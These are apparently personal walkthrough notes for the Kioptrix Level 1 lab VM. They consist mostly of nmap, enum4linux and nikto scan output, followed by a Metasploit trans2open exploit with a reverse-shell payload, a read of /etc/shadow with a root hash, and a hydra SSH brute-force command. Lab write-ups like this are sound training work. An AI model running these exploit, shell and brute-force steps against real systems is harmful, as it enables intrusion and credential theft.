# Kioptrix Level 1

Monday, August 1, 2022

11:08 PM

SCAN HOST:

sudo netdiscover -r 192.168.1.0/24

arp-scan -l

SCAN PORT:

nmap -A 192.168.1.4

Starting Nmap 7.92 (  ) at 2022-08-01 05:14 EDT

Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan

Service scan Timing: About 16.67% done; ETC: 05:15 (0:00:30 remaining)

Nmap scan report for 192.168.1.4

Host is up (0.0020s latency).

Not shown: 994 closed tcp ports (reset)

PORT          STATE SERVICE         VERSION

22/tcp        open  ssh             OpenSSH 2.9p2 (protocol 1.99)

|_sshv1: Server supports SSHv1

| ssh-hostkey:

|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)

|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)

|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)

80/tcp    open  http            Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)

|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

|_http-title: Test Page for the Apache Web Server on Red Hat Linux

| http-methods:

|_  Potentially risky methods: TRACE

111/tcp   open  rpcbind         2 (RPC #100000)

| rpcinfo:

|   program version        port/proto  service

|   100000  2                111/tcp   rpcbind

|   100000  2                111/udp   rpcbind

|   100024  1              32768/tcp   status

|_  100024  1              32768/udp   status

139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)

443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--

| Not valid before: 2009-09-26T09:32:06

|_Not valid after:  2010-09-26T09:32:06

|_ssl-date: 2022-08-01T13:14:50+00:00; +3h59m58s from scanner time.

| sslv2:

|   SSLv2 supported

|   ciphers:

|         SSL2_RC2_128_CBC_EXPORT40_WITH_MD5

|         SSL2_RC4_128_EXPORT40_WITH_MD5

|         SSL2_RC4_64_WITH_MD5

|         SSL2_DES_64_CBC_WITH_MD5

|         SSL2_RC2_128_CBC_WITH_MD5

|         SSL2_DES_192_EDE3_CBC_WITH_MD5

|_        SSL2_RC4_128_WITH_MD5

|_http-title: 400 Bad Request

32768/tcp open  status          1 (RPC #100024)

MAC Address: 08:00:27:60:13:70 (Oracle VirtualBox virtual NIC)

Device type: general purpose

Running: Linux 2.4.X

OS CPE: cpe:/o:linux:linux_kernel:2.4

OS details: Linux 2.4.9 - 2.4.18 (likely embedded)

Network Distance: 1 hop

Host script results:

|_clock-skew: 3h59m57s

|_smb2-time: Protocol negotiation failed (SMB2)

|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE

HOP RTT         ADDRESS

1   2.04 ms 192.168.1.4

OS and Service detection performed. Please report any incorrect results at  .

Nmap done: 1 IP address (1 host up) scanned in 20.38 seconds

enum4linux -a 192.168.1.4

Starting enum4linux v0.9.1 (  ) on Mon Aug  1 04:53:00 2022

=========================================( Target Information )=========================================

Target ........... 192.168.1.4

RID Range ........ 500-550,1000-1050

Username ......... ''

Password ......... ''

Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

============================( Enumerating Workgroup/Domain on 192.168.1.4 )============================

[+] Got domain/workgroup name: MYGROUP

================================( Nbtstat Information for 192.168.1.4 )================================

Looking up status of 192.168.1.4

KIOPTRIX            <00> -             B <ACTIVE>  Workstation Service

KIOPTRIX            <03> -             B <ACTIVE>  Messenger Service

KIOPTRIX            <20> -             B <ACTIVE>  File Server Service

MYGROUP             <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

MYGROUP             <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

MAC Address = 00-00-00-00-00-00

====================================( Session Check on 192.168.1.4 )====================================

[+] Server 192.168.1.4 allows sessions using username '', password ''

=================================( Getting domain SID for 192.168.1.4 )=================================

Domain Name: MYGROUP

Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup

===================================( OS information on 192.168.1.4 )===================================

[E] Can't get OS info with smbclient

[+] Got OS info for 192.168.1.4 from srvinfo:

KIOPTRIX           Wk Sv PrQ Unx NT SNT Samba Server

platform_id         :           500

os version          :           4.5

server type         :           0x9a03

========================================( Users on 192.168.1.4 )========================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.

Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.

Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

==================================( Share Enumeration on 192.168.1.4 )==================================

Sharename           Type          Comment

---------           ----          -------

IPC$                IPC           IPC Service (Samba Server)

ADMIN$              IPC           IPC Service (Samba Server)

Reconnecting with SMB1 for workgroup listing.

Server                   Comment

---------                -------

KIOPTRIX                 Samba Server

Workgroup                Master

---------                -------

MYGROUP

[+] Attempting to map shares on 192.168.1.4

[E] Can't understand response:

NT_STATUS_NETWORK_ACCESS_DENIED listing \*

//192.168.1.4/IPC$          Mapping: N/A Listing: N/A Writing: N/A

[E] Can't understand response:

tree connect failed: NT_STATUS_WRONG_PASSWORD

//192.168.1.4/ADMIN$        Mapping: N/A Listing: N/A Writing: N/A

============================( Password Policy Information for 192.168.1.4 )============================

[E] Unexpected error from polenum:

[+] Attaching to 192.168.1.4 using a NULL share

[+] Trying protocol 139/SMB...

[!] Protocol failed: SMB SessionError: 0x5

[+] Trying protocol 445/SMB...

[!] Protocol failed: [Errno Connection error (192.168.1.4:445)] [Errno 111] Connection refused

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled

Minimum Password Length: 0

=======================================( Groups on 192.168.1.4 )=======================================

[+] Getting builtin groups:

group:[Administrators] rid:[0x220]

group:[Users] rid:[0x221]

group:[Guests] rid:[0x222]

group:[Power Users] rid:[0x223]

group:[Account Operators] rid:[0x224]

group:[System Operators] rid:[0x225]

group:[Print Operators] rid:[0x226]

group:[Backup Operators] rid:[0x227]

group:[Replicator] rid:[0x228]

[+]  Getting builtin group memberships:

Group: Backup Operators' (RID: 551) has member: Couldn't find group Backup Operators

Group: Guests' (RID: 546) has member: Couldn't find group Guests

Group: Power Users' (RID: 547) has member: Couldn't find group Power Users

Group: Administrators' (RID: 544) has member: Couldn't find group Administrators

Group: Replicator' (RID: 552) has member: Couldn't find group Replicator

Group: Print Operators' (RID: 550) has member: Couldn't find group Print Operators

Group: Users' (RID: 545) has member: Couldn't find group Users

Group: System Operators' (RID: 549) has member: Couldn't find group System Operators

Group: Account Operators' (RID: 548) has member: Couldn't find group Account Operators

[+]  Getting local groups:

group:[sys] rid:[0x3ef]

group:[tty] rid:[0x3f3]

group:[disk] rid:[0x3f5]

group:[mem] rid:[0x3f9]

group:[kmem] rid:[0x3fb]

group:[wheel] rid:[0x3fd]

group:[man] rid:[0x407]

group:[dip] rid:[0x439]

group:[lock] rid:[0x455]

group:[users] rid:[0x4b1]

group:[slocate] rid:[0x413]

group:[floppy] rid:[0x40f]

group:[utmp] rid:[0x415]

[+]  Getting local group memberships:

[+]  Getting domain groups:

group:[Domain Admins] rid:[0x200]

group:[Domain Users] rid:[0x201]

[+]  Getting domain group memberships:

Group: 'Domain Admins' (RID: 512) has member: Couldn't find group Domain Admins

Group: 'Domain Users' (RID: 513) has member: Couldn't find group Domain Users

===================( Users on 192.168.1.4 via RID cycling (RIDS: 500-550,1000-1050) )===================

[I] Found new SID:

S-1-5-21-4157223341-3243572438-1405127623

[+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username '', password ''

S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\unix_group.2147483399 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\unix_group.2147483399 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\unix_group.2147483400 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\unix_group.2147483400 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\unix_group.2147483401 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\unix_group.2147483401 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\unix_group.2147483402 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\unix_group.2147483402 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\unix_group.2147483403 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\unix_group.2147483403 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\Domain Admins (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\Domain Users (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\Domain Guests (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\unix_group.2147483405 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\unix_group.2147483406 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\unix_group.2147483406 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\unix_group.2147483407 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\unix_group.2147483407 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\unix_group.2147483408 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\unix_group.2147483408 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\unix_group.2147483409 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\unix_group.2147483409 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\unix_group.2147483410 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\unix_group.2147483410 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\unix_group.2147483411 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\unix_group.2147483411 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\unix_group.2147483412 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\unix_group.2147483412 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\unix_group.2147483413 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\unix_group.2147483413 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\unix_group.2147483414 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\unix_group.2147483414 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\unix_group.2147483415 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\unix_group.2147483415 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\unix_group.2147483416 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\unix_group.2147483416 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\unix_group.2147483417 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\unix_group.2147483417 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\unix_group.2147483418 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\unix_group.2147483418 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\unix_group.2147483419 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\unix_group.2147483419 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\unix_group.2147483420 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\unix_group.2147483420 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\unix_group.2147483421 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\unix_group.2147483421 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\unix_group.2147483422 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\unix_group.2147483422 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\unix_group.2147483423 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\root (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\bin (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\bin (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\daemon (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\daemon (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\adm (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\sys (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\lp (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\adm (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\sync (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\tty (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\shutdown (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\disk (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\halt (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\lp (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\mail (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\mem (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\news (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\kmem (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\uucp (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\wheel (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\operator (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\unix_group.11 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\games (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\mail (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\gopher (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\news (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\ftp (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\uucp (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\unix_user.15 (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\man (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\unix_user.16 (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\unix_group.16 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\unix_user.17 (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\unix_group.17 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\unix_user.18 (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\unix_group.18 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\unix_user.19 (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\floppy (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\unix_user.20 (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\games (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\unix_user.21 (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\slocate (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\unix_user.22 (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\utmp (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\squid (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\squid (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\unix_user.24 (Local User)

S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\unix_group.24 (Local Group)

S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)

================================( Getting printer info for 192.168.1.4 )================================

No printers returned.

enum4linux complete on Mon Aug  1 04:53:08 2022

nikto -h

- Nikto v2.1.6
---------------------------------------------------------------------------

+ Target IP:              192.168.1.4

+ Target Hostname:        192.168.1.4

+ Target Port:            80

+ Start Time:             2022-08-01 05:14:12 (GMT-4)

---------------------------------------------------------------------------

+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001

+ The anti-clickjacking X-Frame-Options header is not present.

+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS

+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type

+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)

+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.

+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.

+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header

+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE

+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST

+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.

+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.

+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.

+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. , OSVDB-756.

+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.

+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).

+ OSVDB-3268: /manual/: Directory indexing found.

+ OSVDB-3092: /manual/: Web server manual found.

+ OSVDB-3268: /icons/: Directory indexing found.

+ OSVDB-3233: /icons/README: Apache default file found.

+ OSVDB-3092: /test.php: This might be interesting...

+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.

+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.

+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.

+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.

+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.

+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.

+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.

+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.

+ /shell?cat+/etc/hosts: A backdoor was identified.

+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host

+ End Time:               2022-08-01 05:14:52 (GMT-4) (40 seconds)

---------------------------------------------------------------------------

+ 1 host(s) tested

SMB ENUM:

msf6 > search smb_version

Matching Modules

================

#  Name                                   Disclosure Date  Rank        Check  Description

-  ----                                   ---------------  ----        -----  -----------

0  auxiliary/scanner/smb/smb_version                   normal  No         SMB Version Detection

Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version

msf6 > use 0

msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.4

RHOSTS => 192.168.1.4

msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.1.4:139           - SMB Detected (versions:) (preferred dialect:) (signatures:optional)

[*] 192.168.1.4:139           -   Host could not be identified: Unix (Samba 2.2.1a)

[*] 192.168.1.4:              - Scanned 1 of 1 hosts (100% complete)

[*] Auxiliary module execution completed

smbclient -L

Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set

Anonymous login successful

Password for [WORKGROUP\kali]:

Sharename           Type          Comment

---------           ----          -------

IPC$                IPC           IPC Service (Samba Server)

ADMIN$              IPC           IPC Service (Samba Server)

smbclient

Password for [WORKGROUP\kali]:

Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set

Anonymous login successful

Try "help" to get a list of possible commands.

smb: \> ls

NT_STATUS_NETWORK_ACCESS_DENIED listing \*

Exploit

msf exploit(linux/samba/trans2open) > set RHOST192.168.1.14

msf exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp

msf exploit(linux/samba/trans2open) > set lhost 192.168.1.6

msf exploit(linux/samba/trans2open) > exploit

manual exploit: openluck

cat /etc/shadow

root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::

Crack password:

hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://192.168.1.4:22 -t 4 -V

or use ssh_login in msf

